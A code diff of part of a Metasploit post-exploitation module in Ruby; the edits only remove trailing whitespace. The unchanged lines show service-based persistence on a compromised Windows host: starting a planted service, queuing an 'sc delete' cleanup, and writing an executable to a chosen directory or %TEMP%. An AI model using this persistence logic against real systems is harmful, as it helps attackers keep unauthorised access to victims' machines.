@@ -159,7 +159,7 @@ class MetasploitModule < Msf::Post
       end
 
       # if service is stopped, then start it.
-      service_start(nam) if service_status(nam)[:state] == 1 
+      service_start(nam) if service_status(nam)[:state] == 1
 
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
@@ -170,21 +170,21 @@ class MetasploitModule < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(rexe, rexename)
-    if not datastore['LEXEPATH'].nil? 
-    # check we have write permissions 
+    if not datastore['LEXEPATH'].nil?
+    # check we have write permissions
     # I made it by myself because the function filestat.writable? was not implemented yet.
       testfile = datastore['LEXEPATH'] + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
       fd = session.fs.file.new(testfile,"w")
-      if fd 
+      if fd
         fd.close
         session.fs.file.rm(testfile)
-        tempdir = datastore['LEXEPATH'] 
+        tempdir = datastore['LEXEPATH']
       else
         print_warning("Insufficient privileges to write in  #{datastore['LEXEPATH']}")
       end
 
     # Write to %temp% directory if not writable or not set LEXEPATH
-    else 
+    else
       tempdir = session.fs.file.expand_path("%TEMP%")
     end
 
